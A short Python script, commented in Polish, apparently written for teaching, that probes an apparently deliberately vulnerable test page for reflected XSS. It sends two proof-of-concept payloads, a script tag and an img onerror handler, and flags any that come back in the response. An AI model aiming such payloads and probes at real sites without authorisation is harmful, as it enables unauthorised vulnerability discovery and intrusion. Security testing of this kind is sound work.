# SKRYP SPRAWDZAJĄCY APLIKACJĘ WEBOWĄ POD KĄTEM PODATNOŚCI NA ATAKI XSS

# import biblioteki request - do wysyłania zapytań HTTP
import requests
# biblioteka BeautifulSoup - sprawdzanie czy kod JavaScript znalazł się w stronie HTTP
# polepsza czytelność odpowiedzi
from bs4 import BeautifulSoup

# wybieramy adres strony, którą sprawdzimy
url = "http://testphp.vulnweb.com/artists.php"  # adres przyjmujący parametr GET
# payloady, które spróbują uruchomić atak
xss_payloads = ["<script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>"]

# testowanie payloadów po kolei
for payload in xss_payloads:
    params = {"artist": payload}  # parametr GET
    # wysłanie zapytania GET
    response = requests.get(url, params=params)
    # zmienienie struktury na czytelniejszą
    soup = BeautifulSoup(response.text, 'html.parser')
    # sprawdzamy czy payload jest w odpowiedzi
    if payload in response.text:
        print(f"Możliwa podatność XSS dla payloadu: {payload}")
